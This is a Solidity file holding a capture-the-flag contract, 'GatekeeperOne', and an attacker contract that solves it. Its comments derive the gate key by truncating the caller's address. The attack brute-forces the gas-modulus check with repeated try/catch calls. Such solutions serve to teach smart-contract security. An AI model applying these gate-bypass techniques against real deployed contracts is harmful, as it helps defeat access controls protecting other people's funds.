// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft() % 8191 == 0,"gas not divisible by 8191");
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract GatekeeperOneAttack {
    GatekeeperOne public gk;
    uint256 public gl;
    uint256 public ic;

    constructor(address add) {
        gk=GatekeeperOne(add);
    }

    function setGateKeeper(address add) public {
        gk=GatekeeperOne(add);
    }

//unit160 - 20 bytes - 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
//uint16  - 2  bytes - 0xDDC4
//uint32  - 4  bytes - 0x56beddC4

//uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
//uint32(uint64(_gateKey)) != uint64(_gateKey)
//uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))

//to satisfy above conditions
//bytes8 value of gatekey should be //0x000000010000DDC4

    function attack(bytes8 gateKey) public {
        uint256 g = 8191 *10;
        gl= gasleft();
        uint count = 0;
        for (uint256 i = 0; i <= 8191; i++) {
            count++;
            try gk.enter{gas: g + i}(gateKey) {
                break;
            } catch {}
        }
        ic=count;
    }
}

